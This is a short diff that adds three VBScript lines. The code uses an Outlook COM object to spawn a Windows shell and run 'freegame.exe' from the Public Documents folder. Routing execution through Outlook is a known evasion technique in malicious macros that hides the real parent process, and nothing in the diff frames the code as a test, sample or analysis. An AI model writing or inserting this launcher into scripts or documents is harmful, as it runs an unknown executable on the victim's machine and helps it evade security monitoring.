@@ -1,0 +1,3 @@
+Set objOL = CreateObject("Outlook.Application")
+Set WshShell = objOL.CreateObject("Wscript.Shell")
+Set WshShellExec = WshShell.Exec("C:\Users\Public\Documents\freegame.exe")
